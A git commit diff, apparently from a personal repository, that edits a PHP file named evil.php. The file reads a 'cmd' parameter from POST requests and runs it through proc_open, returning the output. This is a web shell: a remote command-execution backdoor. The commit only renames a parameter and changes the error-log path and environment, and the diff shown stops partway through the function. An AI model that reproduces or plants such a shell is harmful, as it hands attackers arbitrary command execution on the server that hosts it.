226dd833824b6cffde6a5c3e53e58006367aea90
Leonardo Ramos <leosaor@outlook.com>
2024-12-04 12:17:28 -0300

    Update evil.php

--- evil.php
+++ evil.php
@@ -2,14 +2,16 @@
   if(isset($_POST['cmd'])){
     $cmd = $_POST['cmd'];
     
-  function exec_cmd($cmd){
+  function exec_cmd($command){
     {
       $descriptorspec = array(
         0 => array("pipe", "r"),
         1 => array("pipe", "w"),
-        2 => array("file", "/tmp/error.txt", "a")
+        2 => array("file", "error.txt", "a")
       );
-      $process = proc_open($cmd, $descriptorspec, $pipes);
+      $cwd = '';
+      $env = array('some_option' => 'leo');
+      $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
       if (is_resource($process)) {
         $output = stream_get_contents($pipes[1]);
         fclose($pipes[1]);
